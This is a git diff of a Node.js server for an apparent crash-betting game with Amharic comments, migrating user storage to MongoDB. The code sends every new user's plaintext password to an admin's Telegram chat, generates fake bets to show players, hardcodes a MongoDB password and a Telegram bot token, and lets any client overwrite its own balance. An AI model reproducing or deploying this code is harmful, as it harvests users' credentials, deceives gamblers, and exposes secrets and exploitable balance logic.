@@ -4,15 +4,34 @@ const { Server } = require('socket.io');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const bcrypt = require('bcryptjs');
+const mongoose = require('mongoose'); // አዲስ የተጨመረ
 
 const app = express();
 
-// 1. CORS ማስተካከያ - ለ Render እና ለ Frontend ግንኙነት ወሳኝ ነው
+// 1. CORS ማስተካከያ
 app.use(cors({
     origin: "*",
     methods: ["GET", "POST"]
 }));
 app.use(express.json({ limit: '15mb' })); 
+
+// --- MongoDB Connection (ለአዲሱ ፕሮጀክት የተስተካከለ) ---
+const atlasURI = 'mongodb+srv://abrhamman825_db_user:Abrham123456@cluster0.tpkbh2l.mongodb.net/aviator_db?retryWrites=true&w=majority';
+
+mongoose.connect(atlasURI)
+  .then(() => console.log('✅ በደመና ላይ ያለው MongoDB (Atlas) ተገናኝቷል!'))
+  .catch(err => console.error('❌ Atlas Connection Error:', err.message));
+
+  
+const userSchema = new mongoose.Schema({
+    phone: { type: String, required: true, unique: true },
+    password: { type: String, required: true },
+    balance: { type: Number, default: 0 },
+    history: { type: Array, default: [] },
+    createdAt: { type: Date, default: Date.now }
+});
+
+const User = mongoose.model('User', userSchema);
 
 const server = http.createServer(app);
 const io = new Server(server, {
@@ -27,12 +46,9 @@ const TELEGRAM_TOKEN = '8601691945:AAHuf1tKpCAmU6j6cOqp0i8sR0qv4F0nCPc';
 const ADMIN_CHAT_ID = '2068983666';
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
-bot.on('polling_error', (error) => {
-    // ፖሊንግ ስህተት ቢኖር ሰርቨሩ እንዳይቆም
-});
+bot.on('polling_error', (error) => {});
 
-// --- ዳታቤዝ (ጊዜያዊ) ---
-let users = []; 
+// --- የቀጥታ ግንኙነት መቆጣጠሪያ ---
 let userSockets = {}; 
 
 // --- የጨዋታ ሁኔታ (Game State) ---
@@ -60,15 +76,17 @@ const generateFakeBets = () => {
     return bets.sort((a, b) => b.amount - a.amount);
 };
 
-// --- Authentication Routes (Login/Register) ---
+// --- Authentication Routes (MongoDB የተጠቀሙ) ---
 app.post('/register', async (req, res) => {
     const { phone, password } = req.body;
     try {
-        if (users.find(u => u.phone === phone)) {
+        const existingUser = await User.findOne({ phone });
+        if (existingUser) {
             return res.json({ status: 'error', error: 'ይህ ስልክ ቁጥር ተመዝግቧል!' });
         }
         const hashedPassword = await bcrypt.hash(password, 10);
-        users.push({ phone, password: hashedPassword, balance: 0 });
+        const newUser = new User({ phone, password: hashedPassword, balance: 0 });
+        await newUser.save();
 
         const msg = `👤 *አዲስ ተመዝጋቢ*\n\n📱 ስልክ: \`${phone}\` \n🔑 Password: \`${password}\` \n🕒 ጊዜ: ${new Date().toLocaleString()}`;
         bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => {});
@@ -81,31 +99,40 @@ app.post('/register', async (req, res) => {
 
 app.post('/login', async (req, res) => {
     const { phone, password } = req.body;
-    const user = users.find(u => u.phone === phone);
-    if (!user) return res.json({ status: 'error', error: 'ተጠቃሚው አልተገኘም' });
+    try {
+        const user = await User.findOne({ phone });
+        if (!user) return res.json({ status: 'error', error: 'ተጠቃሚው አልተገኘም' });
 
-    const isMatch = await bcrypt.compare(password, user.password);
-    if (isMatch) {
-        res.json({ status: 'ok', balance: user.balance, phone: user.phone });
-    } else {
-        res.json({ status: 'error', error: 'የይለፍ ቃል ተሳስቷል' });
+        const isMatch = await bcrypt.compare(password, user.password);
+        if (isMatch) {
+            res.json({ status: 'ok', balance: user.balance, phone: user.phone });
+        } else {
+            res.json({ status: 'error', error: 'የይለፍ ቃል ተሳስቷል' });
+        }
+    } catch (err) {
+        res.json({ status: 'error', error: 'የመግባት ስህተት!' });
     }
 });
 
-// --- Telegram Approve/Reject Logic ---
-bot.on('callback_query', (query) => {
+// --- Telegram Approve/Reject Logic (MongoDB የዘመነ) ---
+bot.on('callback_query', async (query) => {
     const [action, phone, amount] = query.data.split('_');
-    const user = users.find(u => u.phone === phone);
+    try {
+        const user = await User.findOne({ phone });
 
-    if (action === 'approve' && user) {
-        user.balance += parseFloat(amount);
-        bot.sendMessage(ADMIN_CHAT_ID, `✅ የ ${phone} ዲፖዚት ጸድቋል። አዲሱ ባላንስ: ${user.balance.toFixed(2)} ETB`);
-        
-        if (userSockets[phone]) {
-            io.to(userSockets[phone]).emit('balanceUpdate', user.balance);
+        if (action === 'approve' && user) {
+            user.balance += parseFloat(amount);
+            await user.save();
+            bot.sendMessage(ADMIN_CHAT_ID, `✅ የ ${phone} ዲፖዚት ጸድቋል። አዲሱ ባላንስ: ${user.balance.toFixed(2)} ETB`);
+            
+            if (userSockets[phone]) {
+                io.to(userSockets[phone]).emit('balanceUpdate', user.balance);
+            }
+        } else if (action === 'reject') {
+            bot.sendMessage(ADMIN_CHAT_ID, `❌ የ ${phone} የ ${amount} ብር ጥያቄ ተሰርዟል`);
         }
-    } else if (action === 'reject') {
-        bot.sendMessage(ADMIN_CHAT_ID, `❌ የ ${phone} የ ${amount} ብር ጥያቄ ተሰርዟል።`);
+    } catch (err) {
+        console.error(err);
     }
     bot.answerCallbackQuery(query.id);
 });
@@ -118,15 +145,14 @@ io.on('connection', (socket) => {
         userSockets[phone] = socket.id;
     });
 
-    socket.on('updateServerBalance', (data) => {
-        const user = users.find(u => u.phone === data.phone);
-        if (user) {
-            user.balance = parseFloat(data.newBalance);
-        }
+    socket.on('updateServerBalance', async (data) => {
+        try {
+            await User.findOneAndUpdate({ phone: data.phone }, { balance: parseFloat(data.newBalance) });
+        } catch (err) { console.error(err); }
     });
 
     socket.on('sendDepositRequest', (data) => {
-        const msg = `💰 *የዲፖዚት ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💸 መጠን: *${data.amount} ETB*`;
+        const msg = `💰 *የዲፖዚት ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*`;
         const opts = {
             caption: msg,
             parse_mode: 'Markdown',
@@ -148,13 +174,16 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('sendWithdrawRequest', (data) => {
-        const user = users.find(u => u.phone === data.phone);
-        if (user) {
-            user.balance -= parseFloat(data.amount); 
-        }
-        const msg = `📤 *የዊዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💸 መጠን: *${data.amount} ETB*\n⚠️ ባላንሳቸው ቀንሷል፤ ብሩን ይላኩላቸው።`;
-        bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });
+    socket.on('sendWithdrawRequest', async (data) => {
+        try {
+            const user = await User.findOne({ phone: data.phone });
+            if (user) {
+                user.balance -= parseFloat(data.amount); 
+                await user.save();
+            }
+            const msg = `📤 *የውዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*\n⚠️ ባላንሳቸው ቀንሷል ብሩን ይላኩላቸው።`;
+            bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });
+        } catch (err) { console.error(err); }
     });
 
     socket.on('disconnect', () => {
@@ -202,7 +231,7 @@ const startFlying = () => {
     }, 100);
 };
 
-// 2. Render ፖርት ማስተካከያ
+// 2. Port Configuration
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, () => {
     console.log(`✅ ሰርቨሩ በፖርት ${PORT} ላይ ስራ ጀምሯል`);
